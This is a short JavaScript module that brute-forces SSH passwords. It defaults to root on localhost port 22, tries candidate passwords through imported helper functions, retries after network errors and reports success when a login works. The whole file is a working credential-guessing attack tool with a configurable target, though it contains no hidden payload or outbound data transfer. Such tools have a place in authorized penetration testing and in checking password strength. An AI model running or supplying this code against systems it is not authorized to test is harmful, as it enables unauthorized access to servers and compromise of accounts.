const bruteForce = require('./bruteForce')
const delay = require('./delay')
const ssh = require('./ssh')

async function sshBruteForce({
  host = '127.0.0.1',
  username = 'root',
  port = 22,
  onFailure = () => undefined,
  filter = () => true,
  errorRetryDelay = 1000,
  verbose = false,
}) {
  const operation = async password => {
    try {
      await ssh({
        host,
        username,
        port,
        password,
      })
      return true
    } catch (error) {
      if (error.level !== 'client-authentication') {
        if (verbose) {
          console.error(error.message)
        }
        await delay(errorRetryDelay)
        const newAttemptResult = await operation(password)
        return newAttemptResult
      }
    }
    return false
  }

  const result = await bruteForce({
    operation,
    filter,
    onFailure,
  })

  return result
}

module.exports = sshBruteForce
